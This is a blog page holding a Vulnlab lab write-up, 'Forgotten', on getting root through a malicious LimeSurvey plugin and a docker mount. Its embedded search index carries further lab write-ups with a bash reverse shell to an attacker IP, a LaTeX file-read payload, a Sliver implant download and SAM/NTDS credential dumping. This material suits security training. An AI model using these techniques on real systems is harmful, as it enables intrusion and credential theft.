<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"}>
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1b" />

    <meta name="description" content="Vulnlab - Forgotten [Easy]">

    
        <title>Vulnlab - Forgotten [Easy] | My New Hugo Site</title>
    

    
    <style>
        :root {
          --background: #ffffff;
        }
        @media (prefers-color-scheme: dark) {
          :root {
            --background: #1b1b1b;
          }
        }
        html {
            background-color: var(--background);
        }
        body {
            background-color: var(--background);
        }
    </style>

    
    <link rel="stylesheet" type="text/css" href="/style.min.dd7f4d768263b31dca99ccfd082ebb2574963449605bddaf5e9b91272f83dff2.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
          </ul>
        </nav>
        




<div id="single-header">
  <h1>
    Vulnlab - Forgotten [Easy]
  </h1>
  <div id="single-meta">
    
        <p id="subtitle">Vulnlab Writeup</p>
    
      

  </div>
</div>





<main><table>
<thead>
<tr>
<th>Name</th>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Forgotten</strong></td>
<td>Linux</td>
<td><!-- raw HTML omitted -->Easy<!-- raw HTML omitted --></td>
</tr>
</tbody>
</table>
<h2 id="summary">Summary</h2>
<p>We would find a website that we are going to fuzz and find an installation page for the <strong>LimeSurvey</strong> software. Then we would set up our local database to work with the installation of that software and run it on the server. We would then install a malicious plugin so that we can gain remote code execution on the machine. Then we would find credentials in the environment variables that we can use to gain access to the SSH. After that, we are going to abuse the mount points of the docker image to gain root on the host machine.</p>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>Upon scanning the machine, we would find a couple of ports open ports.</p>
<pre tabindex="0"><code>$ sudo nmap -sS -sU 10.10.105.241 --min-rate 10000 --open -p-
</code></pre><!-- raw HTML omitted -->
<p>Going to the web page, we would find that it results to status code 403, so the next step that we are going to take is to fuzz it</p>
<pre tabindex="0"><code>$ ffuf -w $commontxt -u http://10.10.105.241/FUZZ
</code></pre><!-- raw HTML omitted -->
<p>Then we would find an installation page for the software <strong>LimeSurvey</strong>.</p>
<!-- raw HTML omitted -->
<p>We are going to try to install it, however to do that we need to install <code>mysql</code> server onto our local server and expose it to the machine so that the system can connect to us, otherwise we would get:</p>
<pre tabindex="0"><code>ERROR 1130 (HY000): Host &#39;&lt;MACHINE_IP&gt;&#39; is not allowed to connect to this MySQL server
</code></pre><p>In order to do that, we would need to set our <strong>MySQL</strong> server to accept connections from anywhere and create a user.</p>
<p>First, we need to edit our configuration</p>
<pre tabindex="0"><code>$ sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf
# Change &#34;bind-address&#34; to &#34;0.0.0.0&#34;
</code></pre><p>Then we can connect using the <code>root</code> user and</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">USER</span> <span style="color:#e6db74">&#39;forgotten&#39;</span><span style="color:#f92672">@</span><span style="color:#e6db74">&#39;%&#39;</span> IDENTIFIED <span style="color:#66d9ef">BY</span> <span style="color:#e6db74">&#39;forgotten&#39;</span>;
</span></span><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">GRANT</span> <span style="color:#66d9ef">ALL</span> <span style="color:#66d9ef">PRIVILEGES</span> <span style="color:#66d9ef">ON</span> <span style="color:#f92672">*</span>.<span style="color:#f92672">*</span> <span style="color:#66d9ef">TO</span> <span style="color:#e6db74">&#39;forgotten&#39;</span><span style="color:#f92672">@</span><span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#66d9ef">WITH</span> <span style="color:#66d9ef">GRANT</span> <span style="color:#66d9ef">OPTION</span>;
</span></span><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> FLUSH <span style="color:#66d9ef">PRIVILEGES</span>;
</span></span></code></pre></div><p>We would then be able to install the <strong>LimeSurvey</strong> and get into the admin panel.</p>
<!-- raw HTML omitted -->
<p>We can now research of some ways to get remote code execution on the machine using this software, a quick google search would lead us to this exploit: <a href="https://github.com/Y1LD1R1M-1337/Limesurvey-RCE"  target="_blank" rel="noreferrer nofollow">LimeSurvey RCE</a>
.</p>
<p>The exploit is leveraging the plugins feature of the software to install a malicious plugin which can connect to our listener.</p>
<p>We can setup such plugin by cloning the repository and replacing the needed variables in the file <code>php-rev.php</code> after that we also need to edit the <code>config.xml</code> and add the installed version of the <strong>LimeSurvey</strong> to the <code>&lt;compatibility&gt;</code> element, after that we would zip the files and upload them.</p>
<pre tabindex="0"><code>$ zip plg.zip ./php-rev.php ./config.xml 
</code></pre><p>We can then navigate to <code>/index.php/admin/pluginmanager?sa=upload</code> to upload our plugin. After we upload it and activate it, we can start a local listener with the given configuration earlier, and to execute our reverse shell we need to head to <code>/survey/upload/plugins/Y1LD1R1M/php-rev.php</code></p>
<!-- raw HTML omitted -->
<p>We can now run <code>linpeas</code> to enumerate further, and upon examining the output we would find this environment variable set in the beginning <code>LIMESURVEY_PASS=5W5&lt;REDACTED&gt;</code> we would also find that the current shell is running within a docker container.</p>
<p>After finding that password I immediately tried it to change the user to <code>root</code> in the current container which worked, and I also tried to SSH with the user <code>limesvc</code> which also worked!</p>
<!-- raw HTML omitted -->
<p>And judging by the system information, it seems that we are not in the docker container anymore, if we list the home directory we would find the <code>user.txt</code> flag.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>We can use a tool called <strong><a href="https://github.com/cdk-team/CDK#cdk---zero-dependency-container-penetration-toolkit"  target="_blank" rel="noreferrer nofollow">CDK - Zero Dependency Container Penetration Toolkit</a>
</strong>  to inspect our docker container which runs the <strong>LimeSurvey</strong> application.</p>
<!-- raw HTML omitted -->
<p>In the <strong>Mounts</strong> section we can see the listed mounts, the <code>resolv.conf | hostname | hosts</code> are standard for every container but the <code>/opt/limesurvey</code> isn&rsquo;t so we can check that out.</p>
<p>We can see that the host has mounted the <code>/opt/limesurvey</code> directory in the <code>/dev/</code> folder on the container, We can go to <code>/dev/</code> to create a single file and check its permissions on the host system. Since that the docker container process is running as <code>root</code> we would have the same permissions from within the container. The file that has been created is having <code>root</code> permissions.</p>
<p>We can now try the same thing but with the <code>bash</code> executable, we would try the following thing on the container:</p>
<pre tabindex="0"><code>root@efaa6f5097ed:/var/www/html/survey# cp /bin/bash ./syl
root@efaa6f5097ed:/var/www/html/survey# chmod u+s ./syl
</code></pre><p>Now on the host machine we can invoke our binary <code>./syl</code> and we should be <code>root</code>.</p>
<pre tabindex="0"><code>limesvc@ip-xxx:/opt/limesurvey$ ./syl -p
syl-5.1# whoami
root
syl-5.1# cat /root/root.txt
VL{&lt;REDACTED&gt;}
</code></pre></main>




<br>

<footer>

<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>

<script>
window.store = {
    
    "http:\/\/localhost:1313\/": {
        "title": "My New Hugo Site",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/"
    },
    
    "http:\/\/localhost:1313\/posts\/example\/": {
        "title": "Posgggggggggge",
        "tags": [],
        "content": "asdasdsa ", 
        "url": "http:\/\/localhost:1313\/posts\/example\/"
    },
    
    "http:\/\/localhost:1313\/posts\/": {
        "title": "Posts",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/posts\/"
    },
    
    "http:\/\/localhost:1313\/categories\/": {
        "title": "Categories",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/categories\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-08-06-htb-irked\/": {
        "title": "Hack The Box - Irked [Easy]",
        "tags": [],
        "content": "Here is a quick xmind map.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-08-06-htb-irked\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-08-05-htb-joker\/": {
        "title": "Hack The Box - Joker [Hard]",
        "tags": [],
        "content": "Here is a quick xmind map.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-08-05-htb-joker\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-06-30-htb-topology\/": {
        "title": "Hack The Box - Topology [Easy]",
        "tags": [],
        "content": "I\u0026rsquo;ve started with simple machine enumeration\n$ nmap -sV 10.10.11.217 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Then I went to topology.htb to check out the website, noticed the possible users (according to the email that is formatted like lklein@topology.htb). I\u0026rsquo;ve enumerated possible users:\nlklein vdaisley dabrahams I went on to figure out what is located at http://latex.topology.htb/equation.php which was the only link on the website. There I found out some LaTeX to PNG convertor. I\u0026rsquo;ve figured out that there must be some trickery with this so I went my way to research the topic.\nI\u0026rsquo;ve found out the following:\nhttps://0day.work/hacking-with-latex/ https://salmonsec.com/cheatsheets/exploitation/latex_injection These two links, helped me to figure out that I had an LFI vulnerability at hand. Upon searching different files such as /etc/passwd, /proc/self/cmdline, /proc/self/environ and so on, I\u0026rsquo;ve figured out that I must be missing something. I began to explore what other subdomains (because there is latex.topology.htb I thought there would be more) were on the webserver using ffuf.\n$ ffuf -w $commontxt -u http://topology.htb/ -H \u0026#34;Host: FUZZ.topology.htb\u0026#34; -r Which yielded the following domains:\ndev stats I\u0026rsquo;ve browsed through those and on the stats there were simple plots about the current usage of the system and that\u0026rsquo;s it. But on the dev subdomain there was a Basic Auth in place which I then figured out that I can read the .htpasswd with the LFI vulnerability in the latex.topology.htb input form.\nI\u0026rsquo;ve tried a couple of times to read the file, but there were unsuccessful, and I went my way to figure out why and what\u0026rsquo;s going on.\nI honestly didn\u0026rsquo;t know how can I read the file and I turned out to some help, which I then understood that I can use the LaTeX/Source Code Listings which also can read a file with \\lstinputlisting{/var/www/dev/.htpasswd}, however the website just resulted in no image (possible error) using just this command.\nHere comes this post to the rescue https://tex.stackexchange.com/questions/410863/what-are-the-differences-between-and Since the website is about math, we can use the inline math delimiters that are $ and $ which can turn my payload from \\lstinputlisting{/var/www/dev/.htpasswd} to $\\lstinputlisting{/var/www/dev/.htpasswd}$ which resulted into getting the basic auth hash.\n$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTZ0 Using hashcat we can extract the password\n$ hashcat -m 1600 crack.txt /usr/share/wordlists/rockyou.txt $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTZ0:goDoItOnYourOwn With that, I tried the users that I\u0026rsquo;ve enumerated earlier and the user vdaisley worked out, so I went to log in with SSH and got the user flag.\nRoot The root was pretty easy, first we can see which directories are writable:\n$ find / -type d -writable 2\u0026gt;/dev/null ... /opt/gnuplot ... This directory looked suspicious, I\u0026rsquo;ve fired up pspy to checkout what is going on and I got this:\nSo we are finding *.plt files in this directory, and then we are executing gnuplot as root. Using this article, I\u0026rsquo;ve crafted a test.plt file with the contents of:\nvdaisley@topology:/opt/gnuplot$ cat ~/test.plt system \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.xx/4444 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; I\u0026rsquo;ve copied the file to the /opt/gnuplot directory and I\u0026rsquo;ve waited to get a remote connection which I got in about a minute. With that I rooted the machine.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-06-30-htb-topology\/"
    },
    
    "http:\/\/localhost:1313\/tags\/": {
        "title": "Tags",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-12-18-vulnlab-baby\/": {
        "title": "Vulnlab - Baby [Easy]",
        "tags": [],
        "content": "Recently I\u0026rsquo;ve started to explore more platforms for hacking different type of boxes and I found that xct has created vulnlab. From what I\u0026rsquo;ve explored, I have to say that I am really impressed with it and so far, I really like it. Here is my writeup for the \u0026ldquo;Baby\u0026rdquo; lab.\nhttps://www.vulnlab.com/ User / Initial Foothold Started with a nmap scan:\nsylsec$ nmap -p- -sT -v -A --open -T 4 --script vuln* -oN nmap.txt -sC -sV $ip -Pn PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services 49664/tcp open msrpc Microsoft Windows RPC 49675/tcp open msrpc Microsoft Windows RPC 59647/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=12/17%Time=657F4FC2%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version SF:\\x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows We can clearly see that this is a Windows machine that is also a part of Active Directory. The domain seems to be baby.vl, I will add this to my /etc/hosts file. After that, I ran enum4linux.\n(I will post only the interesting results)\nsylsec$ enum4linux $ip ... [*] Trying LDAP [+] Appears to be root/parent DC [+] Long domain name is: baby.vl ... [+] Found domain information via SMB NetBIOS computer name: BABYDC NetBIOS domain name: BABY DNS domain: baby.vl FQDN: BabyDC.baby.vl Derived membership: domain member Derived domain: BABY ... Server allows session using username \u0026#39;\u0026#39;, password \u0026#39;\u0026#39; ... [+] Domain: BABY [+] Domain SID: S-1-5-21-1407081343-4001094062-1444647654 [+] Membership: domain member ... OS: Windows 10, Windows Server 2019, Windows Server 2016 OS version: \u0026#39;10.0\u0026#39; OS release: \u0026#39;\u0026#39; OS build: \u0026#39;20348\u0026#39; ... This scan yieled some useful results like the computer name and some information about the system, usually I would try enumerate some more with ldapsearch.\nsylsec$ ldapsearch -LLL -x -H ldap://$ip -b \u0026#39;\u0026#39; -s base \u0026#39;(objectclass=*)\u0026#39; ... rootDomainNamingContext: DC=baby,DC=vl ldapServiceName: baby.vl:babydc$@BABY.VL This didn\u0026rsquo;t yield that much information but we can search for the specific domain components (baby,vl)\n(Only the interesting information)\nsylsec$ ldapsearch -x -H ldap://$ip -D \u0026#39;\u0026#39; -w \u0026#39;\u0026#39; -b \u0026#34;DC=baby,DC=vl\u0026#34; ... # Teresa Bell, it, baby.vl dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user cn: Teresa Bell sn: Bell description: Set initial password to BabyStart123! ... \u0026lt;other users\u0026gt; Now we\u0026rsquo;ve learned that the initial password for the users is BabyStart123!, we can save all the found users under users.txt and try the password against all of them with netexec (previously CrackMapExec).\nsylsec$ netexec smb $ip -u ./users.txt -p ./passwords.txt SMB 10.10.83.68 445 BABYDC [*] Windows 10.0 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) ... SMB 10.10.10.6 445 BABYDC [-] baby.vl\\caroline.robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE ... We found that the user caroline.robinson has the status STATUS_PASSWORD_MUST_CHANGE, we can use smbpasswd.py from the impacket scripts to change the password.\nsylsec$ python3 smbpasswd.py baby.vl/Caroline.Robinson:\u0026#39;BabyStart123!\u0026#39;@$ip -newpass Summer2018! [!] Password is expired, trying to bind with a null session. [*] Password was changed successfully. Now, let\u0026rsquo;s try to use WinRM to log in to the machine.\nsylsec$ evil-winrm -i $ip -u Caroline.Robinson -p \u0026#39;Summer2018!\u0026#39; *Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents\u0026gt; *Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents\u0026gt; type ..\\Desktop\\user.txt VL{\u0026lt;hash\u0026gt;} Root / Privilege Escalation Since I highly dislike evil-winrm due to its instability (atleast on my machine) and the fact that the machine has an active defender which will flag most of the binaries that I will try to put for further enumeration as malicious, I decided to spin up SilverC2 .\nsylsec$ silversrv ██████ ██▓ ██▓ ██▒ █▓▓█████ ██▀███ ▒██ ▒ ▓██▒ ▓██▒▓██░ █▒▓█ ▀ ▓██ ▒ ██▒ ░ ▓██▄ ▒██░ ▒██▒ ▓██ █▒░▒███ ▓██ ░▄█ ▒ ▒ ██▒▒██░ ░██░ ▒██ █░░▒▓█ ▄ ▒██▀▀█▄ ▒██████▒▒░██████▒░██░ ▒▀█░ ░▒████▒░██▓ ▒██▒ ▒ ▒▓▒ ▒ ░░ ▒░▓ ░░▓ ░ ▐░ ░░ ▒░ ░░ ▒▓ ░▒▓░ ░ ░▒ ░ ░░ ░ ▒ ░ ▒ ░ ░ ░░ ░ ░ ░ ░▒ ░ ▒░ ░ ░ ░ ░ ░ ▒ ░ ░░ ░ ░░ ░ ░ ░ ░ ░ ░ ░ ░ ░ All hackers gain fear [*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b [*] Welcome to the sliver shell, please type \u0026#39;help\u0026#39; for options [*] Check for updates with the \u0026#39;update\u0026#39; command [server] sliver \u0026gt; generate --mtls tun0:8888 [*] Generating new windows/amd64 implant binary [*] Symbol obfuscation is enabled [*] Build completed in 39s [*] Implant saved to /home/syl/vulnlab/Baby/EXISTING_CROTCH.exe Now, that I have an implant, I\u0026rsquo;ve transferred it to the server with Invoke-WebRequest.\n*Evil-WinRM* PS C:\\Windows\\TEMP\u0026gt; iwr http://\u0026lt;myIp\u0026gt;:8000/EXISTING_CROTCH.exe -OutFile EXISTING_CROTCH.exe *Evil-WinRM* PS C:\\Windows\\TEMP\u0026gt; .\\EXISTING_CROTCH.exe I\u0026rsquo;ve set up a listener and once I invoke the implant on the machine I will get a session on my server.\n[*] Session b7e812e4 EXISTING_CROTCH - 10.10.83.8:52141 (BabyDC) - windows/amd64 - Mon, 18 Dec 2023 09:57:19 EET Then I\u0026rsquo;ve started to enumerate the privileges first.\n[server] sliver (EXISTING_CROTCH) \u0026gt; getprivs Privilege Information for EXISTING_CROTCH.exe (PID: 3248) --------------------------------------------------------- Process Integrity Level: High Name Description Attributes ==== =========== ========== SeMachineAccountPrivilege Add workstations to domain Enabled, Enabled by Default SeBackupPrivilege Back up files and directories Enabled, Enabled by Default SeRestorePrivilege Restore files and directories Enabled, Enabled by Default SeShutdownPrivilege Shut down the system Enabled, Enabled by Default SeChangeNotifyPrivilege Bypass traverse checking Enabled, Enabled by Default SeIncreaseWorkingSetPrivilege Increase a process working set Enabled, Enabled by Default And I noticed that we have the SeBackupPrivilege and SeRestorePrivilege privilege enabled, that automatically means that we can abuse those to get the ntds.dit,SAM,SYSTEM files to obtain some hashes that we can use further to escalate our privileges.\nThere are a lot of resources for this technique, here are some of my favorite reads:\nhttps://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960 https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#shell-as-svc_backup https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/ I created a file on my local system called syl.dsh which is basically a script file that can execute series of commands, the contents is as follows:\nset context persistent nowriters add volume c: alias syl create expose %syl% z: This sets the context to be persistent, so that the shadow copies will be kept after the diskshadow session is closed. Then we add a shadowcopy of the C:\\ drive with the alias syl, we create it and we expose it as another drive Z:\nThen we can download the shadow copy of the ntds file using the SilverC2\u0026rsquo;s interactive mode.\n[server] sliver (EXISTING_CROTCH) \u0026gt; download Z:\\Windows\\ntds And we also need the SYSTEM and SAM files, which we can get by invoking the reg utility.\n[server] sliver (EXISTING_CROTCH) \u0026gt; reg save hklm\\sam c:\\Temp\\sam [server] sliver (EXISTING_CROTCH) \u0026gt; reg save hklm\\system c:\\Temp\\system ... [server] sliver (EXISTING_CROTCH) \u0026gt; download system [*] Wrote 16842752 bytes (1 file successfully, 0 files unsuccessfully) to /home/syl/vulnlab/Baby/system [server] sliver (EXISTING_CROTCH) \u0026gt; download SAM [*] Wrote 16842752 bytes (1 file successfully, 0 files unsuccessfully) to /home/syl/vulnlab/Baby/SAM Now we can extract the hashes with impacket-secretsdump\nsylsec$ python3 secretsdump.py -system /home/syl/vulnlab/Baby/exfiltrated/system -sam /home/syl/vulnlab/Baby/exfiltrated/SAM -ntds /home/syl/vulnlab/Baby/exfiltrated/ntds.dit LOCAL ... Administrator:500:aad3b435b51404eeaad3b435b51404ee:\u0026lt;HASH\u0026gt;::: ... And once we\u0026rsquo;ve extracted the hash, we can log in to the DC using WinRM.\nsylsec$ evil-winrm -i $ip -u Administrator -H $hash *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; cd ..\\Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; type root.txt VL{\u0026lt;hash\u0026gt;} ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-12-18-vulnlab-baby\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-12-31-vulnlab-baby2\/": {
        "title": "Vulnlab - Baby2 [Medium]",
        "tags": [],
        "content": " Name OS Difficulty Baby2 Windows Medium Summary We will be exploring some SMB shares where we would find some folders of the users and a shortcut that is going to hint of a logon script that gets executed every time a user logs in. Then we are going to exploit some weak credentials and find a writable share that we can use to modify the login VBS script, that would give us the initial shell. Then we are going to exploit some WriteDACL permissions to gain GenericAll permission on our account over a targeted account, which we can use to change the password of that account. After that, this account would have GenericAll permissions over the DDP (Default Domain Policy) and we can leverage that by creating a Scheduled Task that will execute immediately to add our controlled account to the local administrators, with that we can log in with that account, and we will be a local administrator on that machine.\nInitial Foothold We are going to start with an TCP/UDP scan:\n$ sudo nmap -sS -sU 10.10.101.112 --min-rate 10000 Let\u0026rsquo;s start enumerating the surface, since that we have an SMB protocol we can start with it.\nLet\u0026rsquo;s try NULL session first:\nWe cannot list any shares using the null session, so let\u0026rsquo;s move on and try with a random username:\n$ netexec smb 10.10.101.112 -u \u0026#39;sfgsfgsf\u0026#39; -p \u0026#39;\u0026#39; --shares We successfully listed a few shares, we won\u0026rsquo;t go into the default ones, let\u0026rsquo;s see what is in the */apps and /homes:\nWe got a few files, CHANGELOG and login.vbs.lnk which is a Windows Shortcut format, from the CHANGELOG file we understood that some drive mapping is happening and from the login shortcut we can extract the following useful information using lnkinfo:\n$ lnkinfo login.vbs.lnk Local path : C:\\Windows\\SYSVOL\\sysvol\\baby2.vl\\scripts\\login.vbs Network path : \\\\DC\\NETLOGON\\login.vbs Relative path : ..\\..\\..\\Windows\\SYSVOL\\sysvol\\baby2.vl\\scripts\\login.vbs Working directory : C:\\Windows\\SYSVOL\\sysvol\\baby2.vl\\scripts There is a VBS file in the SYSVOL share that we are still unsure what it does, however with the information that we have we can OSINT a bit to understand what are those files.\nWe will find this question in serverfault, which is related to a network drive mapping and some logon scripts. We can conclude that some script is firing up whenever we log in as a user, this will become useful later, so let\u0026rsquo;s note that and move on.\nNext, lets explore the /homes share.\n$ smbclient //10.10.101.112/homes -U \u0026#39;sfgsfgsf\u0026#39; This would give us a list of usernames that are most likely related to the Active Directory. Let\u0026rsquo;s save those in a file and try them against the SMB protocol, for the password we would try to exploit some weak credentials.\n$ netexec smb 10.10.101.112 -u ./credentials/users.txt -p ./credentials/users.txt We would find that we can log in as Carl.Moore since we got a git for his username used as a password.\nLet\u0026rsquo;s list the shares once more, we may have different shares that we can read.\n$ netexec smb baby2.vl -u \u0026#39;Carl.Moore\u0026#39; -p \u0026#39;Carl.Moore\u0026#39; --shares SMB 10.10.101.112 445 DC [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:baby2.vl) SMB 10.10.101.112 445 DC [+] baby2.vl\\Carl.Moore:Carl.Moore SMB 10.10.101.112 445 DC [*] Enumerated shares SMB 10.10.101.112 445 DC Share Permissions Remark SMB 10.10.101.112 445 DC ----- ----------- ------ SMB 10.10.101.112 445 DC ADMIN$ Remote Admin SMB 10.10.101.112 445 DC apps READ,WRITE SMB 10.10.101.112 445 DC C$ Default share SMB 10.10.101.112 445 DC docs READ,WRITE SMB 10.10.101.112 445 DC homes READ,WRITE SMB 10.10.101.112 445 DC IPC$ READ Remote IPC SMB 10.10.101.112 445 DC NETLOGON READ Logon server share SMB 10.10.101.112 445 DC SYSVOL READ Logon server share We can now read the /docs and our other point of interest, which is the SYSVOL share. The /docs share was empty so lets look at the VBS script that is located in the SYSVOL share.\nSub MapNetworkShare(sharePath, driveLetter) Dim objNetwork Set objNetwork = CreateObject(\u0026#34;WScript.Network\u0026#34;) \u0026#39; Check if the drive is already mapped Dim mappedDrives Set mappedDrives = objNetwork.EnumNetworkDrives Dim isMapped isMapped = False For i = 0 To mappedDrives.Count - 1 Step 2 If UCase(mappedDrives.Item(i)) = UCase(driveLetter \u0026amp; \u0026#34;:\u0026#34;) Then isMapped = True Exit For End If Next If isMapped Then objNetwork.RemoveNetworkDrive driveLetter \u0026amp; \u0026#34;:\u0026#34;, True, True End If objNetwork.MapNetworkDrive driveLetter \u0026amp; \u0026#34;:\u0026#34;, sharePath If Err.Number = 0 Then WScript.Echo \u0026#34;Mapped \u0026#34; \u0026amp; driveLetter \u0026amp; \u0026#34;: to \u0026#34; \u0026amp; sharePath Else WScript.Echo \u0026#34;Failed to map \u0026#34; \u0026amp; driveLetter \u0026amp; \u0026#34;: \u0026#34; \u0026amp; Err.Description End If Set objNetwork = Nothing End Sub MapNetworkShare \u0026#34;\\\\dc.baby2.vl\\apps\u0026#34;, \u0026#34;V\u0026#34; MapNetworkShare \u0026#34;\\\\dc.baby2.vl\\docs\u0026#34;, \u0026#34;L\u0026#34; We found the script, that is hinting the same thing that we found in the question above, it is mapping the domain shares as disk drives, nothing else useful can be derived from that. However, one thing that netexec isn\u0026rsquo;t showing (or perhaps it shows wrong) is that we can actually modify this file.\n$ smbcacls //10.10.101.112/SYSVOL /baby2.vl/scripts/login.vbs -U \u0026#39;Carl.Moore%Carl.Moore\u0026#39; REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP baby2.vl\\Domain Users ACL:BUILTIN\\Administrators:ALLOWED/I/FULL ACL:NT AUTHORITY\\Authenticated Users:ALLOWED/I/FULL ACL:Everyone:ALLOWED/I/FULL 